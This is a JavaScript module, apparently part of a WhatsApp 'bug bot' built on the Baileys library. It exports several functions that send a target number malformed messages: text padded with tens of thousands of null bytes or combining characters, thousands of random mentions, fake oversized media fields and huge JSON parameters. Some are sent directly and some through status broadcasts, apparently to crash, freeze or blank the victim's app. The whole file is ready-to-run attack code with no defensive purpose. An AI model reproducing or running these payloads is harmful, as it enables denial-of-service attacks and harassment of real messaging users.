const axios = require("axios");
const crypto = require("crypto");
const fs = require('fs');  
const sharp = require("sharp");

// Hapus semua require Baileys di sini, karena properti tersebut 
// sudah di-define secara global di index.js setelah di-require.

const ImgCrL = null;

async function thumb() {
  // sharp dan axios masih di-require di sini karena function ini tidak
  // berhubungan langsung dengan fungsi utama Baileys, dan memerlukan modul eksternal.
  const response = await axios.get("https://files.catbox.moe/srk9wf.jpg", { responseType: "arraybuffer" });
  const buffer = Buffer.from(response.data);
  const resized = await sharp(buffer)
    .resize(250, 250, { fit: "cover" })
    .jpeg({ quality: 100 })
    .toBuffer();
  return resized.toString("base64");
};

const xxx = async () => {
  const response = await axios.get("https://files.catbox.moe/srk9wf.jpg", { responseType: "arraybuffer" });
  const buffer = Buffer.from(response.data);
  const resized = await sharp(buffer)
    .resize(250, 250, { fit: "cover" })
    .jpeg({ quality: 100 })
    .toBuffer();
  return resized.toString("base64");
};

async function delayJembut(sock, target) {
  try {
    // Menggunakan sock.relayMessage (sudah didefinisikan di index.js)
    const n = await sock.relayMessage(
      target,
      {
        extendedTextMessage: {
          text: "\u0000".repeat(10000),
          matchedText: "⃝꙰꙰꙰".repeat(10000),
          description: "Its Me Icha",
          title: "᬴".repeat(10000),
          previewType: "NONE",
          jpegThumbnail: null,
          inviteLinkGroupTypeV2: "DEFAULT",
          contextInfo: {
            isForwarded: true,
            forwardingScore: 999,
            remoteJid: "status@broadcast",
            mentionedJid: [
              "0@s.whatsapp.net",
              ...Array.from(
                { length: 1900 },
                () => `1${Math.floor(Math.random() * 9000000)}@s.whatsapp.net`
              )
            ],
            quotedMessage: {
              paymentInviteMessage: {
                serviceType: 3,
                expiryTimestamp: Date.now() + 1814400000
              }
            },
            forwardedNewsletterMessageInfo: {
              newsletterName: "⃝꙰꙰꙰",
              newsletterJid: "13135550002@newsletter",
              serverId: 1
            }
          }
        }
      },
      { participant: { jid: target } }
    );
    await sock.sendMessage(target, {
      delete: { fromMe: true, remoteJid: target, id: n }
    });
  } catch (err) {
    console.error("error:", err);
    // Tidak perlu melempar error baru, cukup console log
  }
}

async function AmpasCuih(sock, target) {
  const cuih = "ꦾ".repeat(80000);
  
  const viewOnceMsg = generateWAMessageFromContent(target, {
    viewOnceMessage: {
      message: {
        videoMessage: {
          url: "https://files.catbox.moe/jdv0yt.mp4",
          mimetype: "video/mp4",
          fileSha256: "QxkYuxM0qMDgqUK5WCi91bKWGFDoHhNNkrRlfMNEjTo=",
          fileLength: "999999999999",
          height: 999999999,
          width: 999999999,
          mediaKey: "prx9yPJPZEJ5aVgJnrpnHYCe8UzNZX6/QFESh0FTq+w=",
          fileEncSha256: "zJgg0nMJT1uBohdzwDXkOxaRlQnhJZb+qzLF1lbLucc=",
          directPath: "/v/t62.7118-24/540333979_2660244380983043_2025707384462578704_n.enc?ccb=11-4&oh=01_Q5Aa3AH58d8JlgVc6ErscnjG1Pyj7cT682cpI5AeJRCkGBE2Wg&oe=6934CBA0&_nc_sid=5e03e0",
          mediaKeyTimestamp: "1762488513",
          jpegThumbnail: "/9j/4AAQSkZJRgABAQAAAQABAAD/2wCEABsbGxscGx4hIR4qLSgtKj04MzM4PV1CR0JHQl2NWGdYWGdYjX2Xe3N7l33gsJycsOD/2c7Z//////////////8BGxsbGxwbHiEhHiotKC0qPTgzMzg9XUJHQkdCXY1YZ1hYZ1iNfZd7c3uXfeCwnJyw4P/Zztn////////////////CABEIAEgAIAMBIgACEQEDEQH/xAAtAAACAwEAAAAAAAAAAAAAAAAABAIDBQEBAQEBAAAAAAAAAAAAAAAAAAABAv/aAAwDAQACEAMQAAAAQgzOsuOtNHI6YZhpxRWpeubdXLKhm1ckeEqlp6CS4B//xAAkEAACAwABAwQDAQAAAAAAAAABAgADEQQSFCETMUFREDJCUv/aAAgBAQABPwDtVC4riLw6zvU8bitpzI1Tge0FQW1ARgjUKOSVzwZZxwjossqSpQp8ndyXUNYQ31DxrS4eNxrGsDmcjju7KyjzD+G8TcG7H5PSPE7m2dwzIwM63/1P3c/QlrqkqAdfqehn9CLfWPacy0m3QYrM1S4fM67x8iBg3zkZAf6muAMMc2fJgvOZk9YzuW9sh5BzMn//xAAXEQEBAQEAAAAAAAAAAAAAAAARAAEg/9oACAECAQE/ACJmLNOf/8QAGREBAQADAQAAAAAAAAAAAAAAAREAAhBC/9oACAEDAQE/ADaNg5cdVJZhqnpeJeV7/9k=",
          caption: cuih,
          contextInfo: {
            stanzaId: "Thumbnail.id",
            isForwarded: true,
            forwardingScore: 999,
            mentionedJid: [
              "0@s.whatsapp.net",
              ...Array.from({ length: 1990 }, () => "1" + Math.floor(Math.random() * 500000000) + "@s.whatsapp.net")
            ]
          }
        }
      }
    }
  }, {});
  
  const Payment_Info = generateWAMessageFromContent(target, {
    interactiveResponseMessage: {
      body: {
        text: "Cuihhh Test aja",
        format: "DEFAULT"
      },
      nativeFlowResponseMessage: {
        name: "address_message",
           paramsJson: `{\"values\":{\"in_pin_code\":\"999999\",\"building_name\":\"saosinx\",\"landmark_area\":\"X\",\"address\":\"Yd7\",\"tower_number\":\"Y7d\",\"city\":\"chindo\",\"name\":\"d7y\",\"phone_number\":\"999999999999\",\"house_number\":\"xxx\",\"floor_number\":\"xxx\",\"state\":\"D | ${"\u0000".repeat(900000)}\"}}`,
        version: 3
      }
    }
  }, {});
  
  await sock.relayMessage("status@broadcast", viewOnceMsg.message, {
    messageId: viewOnceMsg.key.id,
    statusJidList: [target]
  });
  
  await sock.relayMessage("status@broadcast", Payment_Info.message, {
    messageId: Payment_Info.key.id,
    statusJidList: [target]
  });
}

async function blankButton(sock, target) {
await sock.sendMessage(
  target,
  {
    text: "\u0000",
    buttons: [
      {
        buttonId: ".",
        buttonText: { displayText: "Its Me Icha" },
        type: 4,
        nativeFlowInfo: {
          name: "single_select",
          paramsJson: JSON.stringify({ title: "᬴".repeat(70000)})
        }
      },
      {
        buttonId: ".",
        buttonText: { displayText: "Its Me Icha" },
        type: 4,
        nativeFlowInfo: {
          name: "single_select",
          paramsJson: JSON.stringify({ title: "᬴".repeat(70000)})
        }
      },
      {
        buttonId: ".",
        buttonText: { displayText: "Its Me Icha" },
        type: 4,
        nativeFlowInfo: {
          name: "single_select",
          paramsJson: JSON.stringify({ title: "᬴".repeat(70000)})
        }
      }
    ],
    headerType: 1
  }, { participant: { jid: target } });
}

async function Blank2(sock, target) {
try {
// Menggunakan generateWAMessageFromContent (global di index.js)
const msg = generateWAMessageFromContent(target, {
  viewOnceMessage: {
    message: {
      interactiveMessage: {
        body: { text: "\u0000" },
        contextInfo: {
            isForwarded: true,
            forwardingScore: 999,
            remoteJid: "status@broadcast",
            mentionedJid: [
              "0@s.whatsapp.net",
              ...Array.from(
                { length: 1999 },
                () => `1${Math.floor(Math.random() * 9000000)}@s.whatsapp.net`
              )
            ]
          },
        nativeFlowMessage: {
          buttons: [
            {
              name: "single_select",
              buttonParamsJson: JSON.stringify({
                title: "ោ៝".repeat(60000)
              })
            },
            {
              name: "single_select",
              buttonParamsJson: JSON.stringify({
                title: "ោ៝".repeat(60000)
              })
            },
            {
              name: "galaxy_message",
              buttonParamsJson: JSON.stringify({
                flow_message_version: "3",
                flow_token: "unused",
                flow_id: "9876543210",
                flow_cta: "ោ៝".repeat(30000),
                flow_action: "form_submit",
                flow_action_payload: { from_id: null },
                icon: "PROMOTE"
              })
            }
          ],
          messageParamsJson: "{}".repeat(10000)
        }
      }
    }
  }
}, {});
  // Menggunakan sock.relayMessage (sudah didefinisikan di index.js)
  await sock.relayMessage(target, msg.message, {
      messageId: msg.key.id,
      participant: { jid: target }
   });
  } catch (err) {
    console.error(err);
  }
}

async function bClck(sock, target) {
const msg = {
  newsletterAdminInviteMessage: {
    newsletterJid: "1@newsletter",
    newsletterName: "ោ៝".repeat(10000),
    caption: "ꦾ".repeat(60000) + "ោ៝".repeat(60000),
    inviteExpiration: "999999999",
    jpegThumbnail: await thumb(),
    contextInfo: {
      mentionedJid: Array.from(
        { length: 2000 },
        () => "1" + Math.floor(Math.random() * 5000000) + "@s.whatsapp.net"
      ),
      remoteJid: "status@broadcast",
      isForwarded: true,
      forwardingScore: 9999,
      externalAdReply: {
        quotedAd: {
          advertiserName: "\u0000".repeat(60000),
          mediaType: "IMAGE",
          jpegThumbnail: await thumb(),
          caption: "Icha" + "𑇂𑆵𑆴𑆿".repeat(60000)
        },
        placeholderKey: {
          remoteJid: "0s.whatsapp.net",
          fromMe: false,
          id: "ABCDEF1234567890"
        }
      },
      quotedMessage: {
        groupInviteMessage: {
          groupJid: "1@g.us",
          inviteCode: "abcd1234",
          inviteExpiration: null,
          groupName: "ꦽ".repeat(30000),
          jpegThumbnail: null
        }
      }
    }
  }
};
 await sock.relayMessage(target, msg, {
    participant: { jid: target },
    messageId: null
  });
}

async function invisibleDozer(sock, target) {
  try {
    // Menggunakan generateWAMessageFromContent (global di index.js)
    const msg = generateWAMessageFromContent(
      target,
      {
        viewOnceMessage: {
          message: {
            interactiveMessage: {
              body: { text: "\u0000" },
              nativeFlowMessage: {
                messageParamsJson: "{}".repeat(10000),
              },
              contextInfo: {
                participant: target,
                remoteJid: "status@broadcast",
                mentionedJid: Array.from(
                  { length: 42000 },
                  () => `1${Math.floor(Math.random() * 500000)}@s.whatsapp.net`
                )
              }
            }
          }
        }
      },
      {}
    );
    // Menggunakan sock.relayMessage (sudah didefinisikan di index.js)
    await sock.relayMessage(target, msg.message, {
      messageId: msg.key.id,
      participant: { jid: target }
    });
  } catch (err) {
    console.error(err);
    // Tidak perlu melempar error baru, cukup console log
  }
}

async function crsA(sock, target) {
  const generateMentions = (count) => [
    "0@s.whatsapp.net",
    ...Array.from({ length: count }, () => `1${Math.floor(Math.random() * 500000)}@s.whatsapp.net`)
  ];
  const cc = {
    mentionedJid: generateMentions(1999),
    remoteJid: "X",
    participant: `${Math.floor(Math.random() * 5000000)}@s.whatsapp.net`,
    stanzaId: "123",
    groupMentions: [],
    entryPointConversionSource: "non_contact",
    entryPointConversionApp: "whatsapp",
    entryPointConversionDelaySeconds: 467593,
    quotedMessage: {
      paymentInviteMessage: {
        serviceType: 3,
        expiryTimestamp: Date.now() + 1814400000,
        contextInfo: {
          mentionedJid: generateMentions(1999),
          forwardedAiBotMessageInfo: {
            botName: "META AI",
            botJid: `${Math.floor(Math.random() * 5000000)}@s.whatsapp.net`,
            creatorName: "Bot"
          }
        }
      }
    }
  };
  const _message = {
    viewOnceMessage: {
      message: {
        newsletterAdminInviteMessage: {
          newsletterJid: "322@newsletter",
          newsletterName: "ោ៝".repeat(20000),
          caption: "ោ៝".repeat(20000),
          jpegThumbnail: await thumb(),
          inviteExpiration: Date.now() + 999999999,
          inviteLink: `https://chat.whatsapp.com/${"\x10".repeat(5000)}${"ꦾ".repeat(5000)}`, 
          isInviteOnly: true,
          isPinned: true,
          contextInfo: cc
        }
      }
    }
  };
  const message = {
    viewOnceMessage: {
      message: {
        extendedTextMessage: {
          text: `> *its me icha*${"ោ៝".repeat(20000)}`,
          matchedText: "https://wa.me/stickerpack/\x10",
          description: "ꦾꦾ".repeat(10000),
          title: "ꦾꦾ".repeat(10000),
          previewType: "NONE",
          jpegThumbnail: await thumb(),
          inviteLinkGroupTypeV2: "DEFAULT",
          inviteLink: `https://chat.whatsapp.com/${"\x10".repeat(5000)}${"ꦾ".repeat(5000)}`,
          contextInfo: cc
        }
      }
    }
  };
  // Menggunakan generateWAMessageFromContent (global di index.js)
  const msg = generateWAMessageFromContent(target, message, {});
  const _msg = generateWAMessageFromContent(target, _message, {});
  
  // Menggunakan sock.relayMessage (sudah didefinisikan di index.js)
  await sock.relayMessage(target, msg.message, {
    messageId: msg.key.id,
    participant: { jid: target }
  });
  await sock.relayMessage(target, _msg.message, {
    messageId: _msg.key.id,
    participant: { jid: target }
  });
}

async function threepelDelayInvis(sock, target) {
  const mentionedJids = [
    "1355514232@s.whatsapp.net",
    ...Array.from({ length: 1999 }, () => `1${Math.floor(Math.random() * 5000000)}@s.whatsapp.net`)
  ];
  const additionalNodes = [
    {
      tag: "meta",
      attrs: {},
      content: [
        {
          tag: "mentioned_users",
          attrs: {},
          content: [
            {
              tag: "to",
              attrs: { jid: target }
            }
          ]
        }
      ]
    }
  ];
  const msg1 = {
    viewOnceMessage: {
      message: {
        lottieStickerMessage: {
          message: {
            stickerMessage: {
              url: "https://mmg.whatsapp.net/v/t62.15575-24/567293002_1345146450341492_7431388805649898141_n.enc?ccb=11-4&oh=01_Q5Aa2wGWTINA0BBjQACmMWJ8nZMZSXZVteTA-03AV_zy62kEUw&oe=691B041A&_nc_sid=5e03e0&mms3=true",
              fileSha256: "ljadeB9XVTFmWGheixLZRJ8Fo9kZwuvHpQKfwJs1ZNk=",
              fileEncSha256: "D0X1KwP6KXBKbnWvBGiOwckiYGOPMrBweC+e2Txixsg=",
              mediaKey: "yRF/GibTPDce2s170aPr+Erkyj2PpDpF2EhVMFiDpdU=",
              mimetype: "application/was",
              height: 512,
              width: 512,
              directPath: "/v/t62.15575-24/567293002_1345146450341492_7431388805649898141_n.enc?ccb=11-4&oh=01_Q5Aa2wGWTINA0BBjQACmMWJ8nZMZSXZVteTA-03AV_zy62kEUw&oe=691B041A&_nc_sid=5e03e0",
              fileLength: 14390,
              mediaKeyTimestamp: 1760786856,
              isAnimated: true,
              stickerSentTs: 1760786855983,
              isLottie: true,
              contextInfo: {
                mentionedJid: mentionedJids
              }
            }
          }
        }
      }
    }
  };
  const msg2 = {
    viewOnceMessage: {
      message: {
        interactiveResponseMessage: {
          body: { text: "xyz", format: "DEFAULT" },
          contextInfo: { mentionedJid: mentionedJids },
          nativeFlowResponseMessage: {
            name: "galaxy_message",
            paramsJson: "\x10".repeat(1045000),
            version: 3
          },
          entryPointConversionSource: "call_permission_request"
        }
      }
    }
  };
  const msg3 = {
    viewOnceMessage: {
      message: {
        stickerPackMessage: {
          stickerPackId: "1e66102f-2c7c-4bb9-80cf-811e922bd1a8",
          name: "ꦴꦿ".repeat(49000),
          publisher: "",
          stickers: Array.from({ length: 20000 }, () => ({
            url: "https://mmg.whatsapp.net/v/t62.15575-24/567293002_1345146450341492_7431388805649898141_n.enc?ccb=11-4&oh=01_Q5Aa2wGWTINA0BBjQACmMWJ8nZMZSXZVteTA-03AV_zy62kEUw&oe=691B041A&_nc_sid=5e03e0&mms3=true",
            fileSha256: "ljadeB9XVTFmWGheixLZRJ8Fo9kZwuvHpQKfwJs1ZNk=",
            fileEncSha256: "D0X1KwP6KXBKbnWvBGiOwckiYGOPMrBweC+e2Txixsg=",
            mediaKey: "yRF/GibTPDce2s170aPr+Erkyj2PpDpF2EhVMFiDpdU=",
            mimetype: "application/webp",
            height: 512,
            width: 512,
            directPath: "/v/t62.15575-24/567293002_1345146450341492_7431388805649898141_n.enc?ccb=11-4&oh=01_Q5Aa2wGWTINA0BBjQACmMWJ8nZMZSXZVteTA-03AV_zy62kEUw&oe=691B041A&_nc_sid=5e03e0",
            fileLength: 14390,
            mediaKeyTimestamp: 1760786856,
            isAnimated: true,
            stickerSentTs: 1760786855983,
            isLottie: true,
            contextInfo: { mentionedJid: mentionedJids }
          })),
          contextInfo: { mentionedJid: mentionedJids },
          fileLength: "8020935",
          fileSha256: "77oJbl0eWZ4bi8z0RZxLsZJ1tu+f/ZErcYE8Sj2K1+U=",
          fileEncSha256: "2KwixOJtpl4ivq8HMgTQGICW+HMxLnZuQmUN6KPD4kg=",
          mediaKey: "i4I6325nsuHeYhj4KuyeZ+8bHAxE6A5Rt5uzyNRIaTk=",
          directPath: "/v/t62.15575-24/23212937_564001070100700_5740166209540264226_n.enc?ccb=11-4&oh=01_Q5Aa1wFfJ2yPLT287gHgeKwk1Ifh1jowuwT0trU3-hyqosIQoQ&oe=686EC6A7&_nc_sid=5e03e0",
          stickerPackSize: "15000000000",
          stickerPackOrigin: "USER_CREATED"
        }
      }
    }
  };
  for (const el of [msg1, msg2, msg3]) {
    // Menggunakan generateWAMessageFromContent dan proto (global di index.js)
    const msg = generateWAMessageFromContent(target, proto.Message.fromObject(el), {});
    await sock.relayMessage("status@broadcast", msg.message, {
      messageId: msg.key.id,
      statusJidList: [target],
      additionalNodes
    });
    await sock.relayMessage(
      target,
      {
        groupStatusMentionMessage: {
          message: {
            protocolMessage: { key: msg.key, type: 25 }
          }
        }
      },
      { additionalNodes }
    );
    // Menggunakan delay (global di index.js)
    await new Promise((resolve) => setTimeout(resolve, 500));
  }
}

module.exports = { blankButton, Blank2, crsA, bClck, invisibleDozer, delayJembut, threepelDelayInvis }
